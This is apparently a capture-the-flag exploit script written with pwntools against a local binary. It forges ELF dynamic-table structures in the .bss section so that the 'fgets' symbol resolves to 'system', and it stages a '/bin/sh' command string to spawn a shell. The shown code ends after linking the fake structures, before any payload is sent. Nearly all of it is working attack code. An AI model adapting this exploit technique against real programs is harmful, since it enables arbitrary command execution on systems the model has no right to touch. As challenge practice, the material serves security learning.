from pwn import *

PH = b'A'

elf = context.binary = ELF('./chal')
libc = elf.libc

local = True

if local:
    io = elf.process()
else:
    host = 'localhost'
    port = 8080
    io = remote(host, port)

if args.GDB:
    gdb.attach(io, """
        b *parse_data+522
        c
    """)


def pack(start, structs, padchr=b'A'):
    """
    packs structs starting at an address, padding as needed
    """
    data = b''
    for addr, struct in structs:
        current = start + len(data)
        if addr < current:
            raise ValueError('Overlapping structs')
        data += padchr * (addr - current)
        data += bytes(struct)
    return data


structs = []
structs_base = elf.bss() + 0x100

# offset to fgets (we'll be replacing it with system)
strtab_offset = elf.section('.dynstr').index(b'fgets\x00')

# Elf64_Dyn
dynamic_entry = Elf64_Dyn(d_tag=elf_const.DT_STRTAB)
structs.append((structs_base, dynamic_entry))

# strings
system_addr = structs_base + sizeof(Elf64_Dyn)
system = b'system\x00'
structs.append((system_addr, system))
sh_addr = system_addr + len(system)
sh = b'/bin/sh > /tmp/stdout\x00'
structs.append((sh_addr, sh))

# link them together
dynamic_union = _U__Elf64_Dyn()
dynamic_union.d_ptr = system_addr - strtab_offset
dynamic_entry.d_un = dynamic_union
